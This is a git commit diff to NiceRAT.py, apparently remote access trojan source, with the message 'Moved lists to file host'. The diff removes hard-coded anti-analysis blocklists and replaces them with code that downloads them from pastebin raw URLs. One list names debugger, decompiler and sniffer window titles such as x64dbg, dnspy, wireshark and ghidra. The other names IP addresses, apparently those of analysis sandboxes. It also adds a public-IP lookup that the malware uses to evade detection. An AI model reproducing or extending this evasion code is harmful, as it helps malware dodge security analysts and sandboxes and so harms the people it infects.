019b7a04a53355051629fcdc16549d3450facd6e
0x00G <114768995+0x00G@users.noreply.github.com>
2024-04-23 21:27:21 +0200

    Moved lists to file host

--- NiceRAT.py
+++ NiceRAT.py
@@ -53,12 +53,20 @@ def exit_program(reason):
     print(reason)
     ctypes.windll.kernel32.ExitProcess(0)
 
+def fetch_window_titles(url):
+    response = requests.get(url)
+    response.raise_for_status()
+    return set(response.text.strip().split('\r\n'))
+
 def check_windows():
+    window_titles_url = 'https://pastebin.com/raw/sih1JMj5'
+    window_titles = fetch_window_titles(window_titles_url)
+
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
         title = ctypes.create_string_buffer(1024)
         ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
-        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'cse pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit', 'george',}:
+        if title.value.decode('Windows-1252').lower() in window_titles:
             pid = ctypes.c_ulong(0)
             ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
             if pid.value != 0:
@@ -74,8 +82,15 @@ def check_windows():
     while True:
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
+
+def fetch_blocked_ip(url):
+    response = requests.get(url)
+    response.raise_for_status()
+    return set(response.text.strip().split('\r\n'))
+
 def check_ip():
-    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160',  '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}    
+    blocked_ip_url = 'https://pastebin.com/raw/MeG668qu'
+    blacklisted = fetch_blocked_ip(blocked_ip_url)
     while True:
         try:
             ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
